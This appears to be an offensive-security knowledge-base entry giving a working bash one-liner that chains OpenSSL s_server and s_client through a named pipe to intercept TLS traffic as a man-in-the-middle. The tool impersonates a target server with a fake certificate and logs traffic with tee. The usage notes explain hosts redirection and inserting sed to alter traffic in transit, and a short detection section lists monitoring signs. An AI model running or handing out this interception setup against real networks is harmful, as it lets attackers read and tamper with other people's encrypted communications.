---
id: f9b690b9-f75c-4120-ace0-07cd7fbec15e
name: openssl-mitm-setup-pipeline
type: code
language: bash
verified: true
created_at: '2023-04-06T03:56:22.336025+00:00'
updated_at: '2023-04-10T20:25:09.845260+00:00'
platforms:
  - Linux
tags:
  - mitm
  - ssl-interception
  - pipeline
validated: true
---

# openssl-mitm-setup-pipeline

## Code

```bash
mkfifo response
sudo openssl s_server -cert server.pem -accept [INTERFACE TO LISTEN TO]:[PORT] -quiet < response | tee | openssl s_client -quiet -servername [domain.of.server.to.mitm] -connect[IP of server to MITM]:[PORT] | tee | cat > response
```

## Description

This bash script sets up a full-duplex MITM proxy using OpenSSL. It creates a named pipe (mkfifo) for bidirectional communication, runs s_server to listen for client connections (impersonating the target with a fake cert), forwards requests to the real server via s_client, and uses tee to log/capture traffic for inspection or modification. It's essential for intercepting SSL traffic in real-time during network discovery attacks.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| [INTERFACE TO LISTEN TO] | Network interface for s_server (e.g., 0.0.0.0) | 0.0.0.0 |
| [PORT] | Listening port for MITM (e.g., 443) | 443 |
| [domain.of.server.to.mitm] | Target domain for SNI | example.com |
| [IP of server to MITM] | Real server's IP | 192.168.1.200 |
| [PORT] | Real server's port | 443 |
| server.pem | Path to self-signed cert/key file | ./server.pem |

## Usage

Run this on the MITM server after generating the certificate with [[commands/generate-ssl-certificate-openssl]] and setting up hosts redirection on the client. Start a client connection (e.g., curl https://target.domain.com) to trigger interception. Monitor the terminal for traffic; insert sed or other tools in the pipeline for modifications. Used in [[procedures/SSL-MITM-Network-Discovery-with-OpenSSL]] step 4.

## Detection

- Monitor for mkfifo creations and unusual OpenSSL processes (s_server/s_client) via ps aux or auditd.
- Network logs showing connections to local IPs for external domains (e.g., via Zeek/Suricata).
- Certificate warnings or HSTS violations on clients.
- Anomalous tee usage in process trees indicating logging of sensitive traffic.

## Related

- [[procedures/SSL-MITM-Network-Discovery-with-OpenSSL]]
- [[tools/openssl]]
